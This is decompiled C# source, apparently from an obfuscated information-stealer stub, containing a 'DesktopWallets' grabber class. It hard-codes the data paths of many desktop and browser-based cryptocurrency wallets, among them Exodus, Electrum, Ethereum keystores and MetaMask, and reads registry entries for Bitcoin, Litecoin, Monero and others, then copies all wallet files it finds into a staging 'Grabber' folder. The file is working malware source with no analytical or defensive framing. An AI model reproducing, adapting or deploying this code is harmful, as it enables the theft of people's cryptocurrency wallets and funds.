using System;
using System.Collections.Generic;
using System.IO;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200002D RID: 45
	internal sealed class DesktopWallets
	{
		// Token: 0x060000D7 RID: 215 RVA: 0x0000A8E8 File Offset: 0x00008AE8
		private static string GetLocalAppDataPath(string subDir)
		{
			return Path.Combine(Paths.localAppData, subDir);
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x0000A904 File Offset: 0x00008B04
		private static string GetRoamingAppDataPath(string subDir)
		{
			return Path.Combine(Paths.roamingAppData, subDir);
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x0000A920 File Offset: 0x00008B20
		public static void GetWallets()
		{
			string text = Path.Combine(Paths.InitWorkDir(), "DesktopWallets", "Grabber");
			try
			{
				foreach (string[] array in DesktopWallets.KnownWalletDirectories)
				{
					DesktopWallets.CopyWalletFromDirectoryTo(text, array[1], array[0]);
				}
				foreach (string text2 in DesktopWallets.KnownWalletsInRegistry)
				{
					DesktopWallets.CopyWalletFromRegistryTo(text, text2);
				}
				foreach (string text3 in DesktopWallets.KnownWalletsInRegistry)
				{
					DesktopWallets.CopyWalletFromRegistryTo(text, text3);
				}
				if (Counter.DesktopWallets == 0 && Directory.Exists(text))
				{
					Filemanager.RecursiveDelete(text);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format("Wallets >> Failed to collect wallets\n{0}", ex));
			}
		}

		// Token: 0x060000DA RID: 218 RVA: 0x0000AA18 File Offset: 0x00008C18
		private static void CopyWalletFromDirectoryTo(string saveDir, string walletDir, string walletName)
		{
			if (Directory.Exists(walletDir))
			{
				if (!Directory.Exists(saveDir))
				{
					Directory.CreateDirectory(saveDir);
				}
				string text = Path.Combine(saveDir, walletName);
				Filemanager.CopyDirectory(walletDir, text);
				Counter.DesktopWallets++;
				Console.WriteLine("Wallets >> Successfully copied wallet files for " + walletName);
			}
		}

		// Token: 0x060000DB RID: 219 RVA: 0x0000AA70 File Offset: 0x00008C70
		private static void CopyWalletFromRegistryTo(string saveDir, string walletRegistry)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software");
				RegistryKey registryKey2;
				if (registryKey == null)
				{
					registryKey2 = null;
				}
				else
				{
					RegistryKey registryKey3 = registryKey.OpenSubKey(walletRegistry);
					registryKey2 = ((registryKey3 != null) ? registryKey3.OpenSubKey(walletRegistry + "-Qt") : null);
				}
				using (RegistryKey registryKey4 = registryKey2)
				{
					if (registryKey4 != null)
					{
						object value = registryKey4.GetValue("strDataDir");
						string text = ((value != null) ? value.ToString() : null);
						if (!string.IsNullOrEmpty(text) && Directory.Exists(text))
						{
							string text2 = Path.Combine(text, "wallets");
							if (!Directory.Exists(saveDir))
							{
								Directory.CreateDirectory(saveDir);
							}
							string text3 = Path.Combine(saveDir, walletRegistry);
							Filemanager.CopyDirectory(text2, text3);
							Counter.DesktopWallets++;
							Console.WriteLine("Wallets >> Successfully copied " + walletRegistry + " wallet from registry");
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format("Wallets >> Failed to collect wallet from registry for {0}\n{1}", walletRegistry, ex));
			}
		}

		// Token: 0x060000DC RID: 220 RVA: 0x000038B4 File Offset: 0x00001AB4
		public DesktopWallets()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060000DD RID: 221 RVA: 0x0000AB7C File Offset: 0x00008D7C
		static DesktopWallets()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			DesktopWallets.KnownWalletDirectories = new List<string[]>
			{
				new string[]
				{
					"Zcash",
					DesktopWallets.GetLocalAppDataPath("Zcash") ?? DesktopWallets.GetRoamingAppDataPath("Zcash")
				},
				new string[]
				{
					"Armory",
					DesktopWallets.GetRoamingAppDataPath("Armory")
				},
				new string[]
				{
					"Bytecoin",
					DesktopWallets.GetRoamingAppDataPath("bytecoin")
				},
				new string[]
				{
					"Jaxx",
					DesktopWallets.GetLocalAppDataPath("com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb") ?? DesktopWallets.GetRoamingAppDataPath("com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb")
				},
				new string[]
				{
					"Exodus",
					DesktopWallets.GetRoamingAppDataPath("Exodus\\exodus.wallet")
				},
				new string[]
				{
					"Ethereum",
					DesktopWallets.GetRoamingAppDataPath("Ethereum\\keystore")
				},
				new string[]
				{
					"Electrum",
					DesktopWallets.GetRoamingAppDataPath("Electrum\\wallets")
				},
				new string[]
				{
					"ElectrumLTC",
					DesktopWallets.GetRoamingAppDataPath("Electrum-LTC\\wallets")
				},
				new string[]
				{
					"AtomicWallet",
					DesktopWallets.GetRoamingAppDataPath("atomic\\Local Storage\\leveldb")
				},
				new string[]
				{
					"Guarda",
					DesktopWallets.GetRoamingAppDataPath("Guarda\\Local Storage\\leveldb")
				},
				new string[]
				{
					"WalletWasabi",
					DesktopWallets.GetRoamingAppDataPath("WalletWasabi\\Client\\Wallets")
				},
				new string[]
				{
					"ElectronCash",
					DesktopWallets.GetRoamingAppDataPath("ElectronCash\\Wallets")
				},
				new string[]
				{
					"Sparrow",
					DesktopWallets.GetRoamingAppDataPath("Sparrow\\Wallets")
				},
				new string[]
				{
					"IOCoin",
					DesktopWallets.GetRoamingAppDataPath("IOCoin")
				},
				new string[]
				{
					"PPCoin",
					DesktopWallets.GetRoamingAppDataPath("PPCoin")
				},
				new string[]
				{
					"BBQCoin",
					DesktopWallets.GetRoamingAppDataPath("BBQCoin")
				},
				new string[]
				{
					"Mincoin",
					DesktopWallets.GetRoamingAppDataPath("Mincoin") ?? DesktopWallets.GetLocalAppDataPath("Mincoin")
				},
				new string[]
				{
					"DevCoin",
					DesktopWallets.GetRoamingAppDataPath("DevCoin")
				},
				new string[]
				{
					"YACoin",
					DesktopWallets.GetRoamingAppDataPath("YACoin")
				},
				new string[]
				{
					"Franko",
					DesktopWallets.GetRoamingAppDataPath("Franko") ?? DesktopWallets.GetLocalAppDataPath("Franko")
				},
				new string[]
				{
					"FreiCoin",
					DesktopWallets.GetRoamingAppDataPath("FreiCoin") ?? DesktopWallets.GetLocalAppDataPath("FreiCoin")
				},
				new string[]
				{
					"Coinomi",
					DesktopWallets.GetRoamingAppDataPath("Coinomi\\Coinomi\\wallets") ?? DesktopWallets.GetLocalAppDataPath("Coinomi\\Coinomi\\wallets")
				},
				new string[]
				{
					"Binance",
					DesktopWallets.GetRoamingAppDataPath("Binance\\Local Storage\\leveldb")
				},
				new string[]
				{
					"Coinbase",
					DesktopWallets.GetLocalAppDataPath("Coinbase") ?? DesktopWallets.GetRoamingAppDataPath("Coinbase")
				},
				new string[]
				{
					"TronLink",
					DesktopWallets.GetLocalAppDataPath("TronLink\\Local Storage\\leveldb") ?? DesktopWallets.GetRoamingAppDataPath("TronLink\\Local Storage\\leveldb")
				},
				new string[]
				{
					"MetaMask",
					DesktopWallets.GetLocalAppDataPath("MetaMask\\IndexedDB\\file__0.indexeddb.leveldb") ?? DesktopWallets.GetRoamingAppDataPath("MetaMask\\IndexedDB\\file__0.indexeddb.leveldb")
				},
				new string[]
				{
					"TrustWallet",
					DesktopWallets.GetLocalAppDataPath("TrustWallet\\Local Storage\\leveldb") ?? DesktopWallets.GetRoamingAppDataPath("TrustWallet\\Local Storage\\leveldb")
				}
			};
			DesktopWallets.KnownWalletsInRegistry = new string[]
			{
				"Litecoin", "Dash", "Bitcoin", "Monero", "Dogecoin", "DashCore", "Qtum", "Electrum_config", "ElectrumLTC_config", "WalletWasabi_config",
				"ElectronCash_config", "Sparrow_config", "AtomicDEX", "Binance_wallet_config"
			};
		}

		// Token: 0x040000E3 RID: 227
		private static readonly List<string[]> KnownWalletDirectories;

		// Token: 0x040000E4 RID: 228
		private static readonly string[] KnownWalletsInRegistry;
	}
}
